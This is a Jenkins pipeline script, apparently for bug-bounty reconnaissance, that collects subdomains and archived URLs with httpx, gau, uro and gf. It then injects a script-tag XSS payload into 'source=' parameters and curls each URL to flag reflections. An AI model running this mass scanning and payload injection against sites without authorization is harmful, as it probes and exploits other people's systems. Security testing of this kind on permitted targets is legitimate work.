pipeline {
    agent { label 'digitalocean' }
    
    parameters {
        string(name: 'DOMAINS', defaultValue: 'muminkoykiran.com.tr', description: '', trim: true)
        
        choice(name: 'SCOPE_TYPE', choices: ['ONLY', 'STAR'], description: 'Domain tipi yıldız scope mi değil mi?')
    }

    options {
        ansiColor('xterm')
    }

    stages {
        stage('xss') {
            steps {
                echo 'checking xss..'
                
                script {
                    def bashScript = "#!/bin/sh\n"
                    
                    DOMAINS.split("\n").each {
                        
                        if (params.SCOPE_TYPE == 'STAR') {
                            bashScript += """echo '$it' ; echo 'tüm subdomainlerin sayısı' ; cat /root/outputs/Subdomains/$it/subdomains.txt | wc -l\n"""
                            bashScript += """[ ! -f /root/outputs/Subdomains/$it/subdomains_httpx_silent.txt ] && cat /root/outputs/Subdomains/$it/subdomains.txt | httpx -silent -threads 1000 > /root/outputs/Subdomains/$it/subdomains_httpx_silent.txt\n"""
                            bashScript += """echo 'httpx sonrası sayı' ; cat /root/outputs/Subdomains/$it/subdomains_httpx_silent.txt | wc -l\n"""
                            bashScript += """cat /root/outputs/Subdomains/$it/subdomains_httpx_silent.txt | gau --blacklist png,jpg,gif,html,json,xml,jpeg,txt,jpg,gif,css,tif,tiff,ttf,woff,woff2,ico --threads 100 > gau.txt\n"""
                        }
                        else if (params.SCOPE_TYPE == 'ONLY') {
                            bashScript += """echo '$it' ; echo '$it' | httpx -silent | awk -F/ '{print \$3}' | gau --blacklist png,jpg,gif,html,json,xml,jpeg,txt,jpg,gif,css,tif,tiff,ttf,woff,woff2,ico --threads 100 > gau.txt\n"""
                        }
                        else {
                            
                        }
                        
                        bashScript += """echo 'gau sonrası sayı' ; cat gau.txt | wc -l\n"""
                        bashScript += """cat gau.txt | uro > uro.txt\n"""
                        bashScript += """echo 'uro sonrası sayı' ; cat uro.txt | wc -l\n"""
                        bashScript += """cat uro.txt | gf xss > xss.txt\n"""
                        bashScript += """echo 'gf xss sonrası sayı' ; cat xss.txt | wc -l\n"""

                        bashScript += '''cat xss.txt | grep "source=" | qsreplace "><script>confirm(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host 33[0;31mVulnerablen";done\n'''
                    }

                    //echo bashScript
                    
                    try {
                        sh bashScript
                    } catch (Exception e) {
                        echo 'Exception occurred: ' + e.toString()
                        //sh 'Handle the exception!'
                    }
                    
                }

            }
        }
    }
}
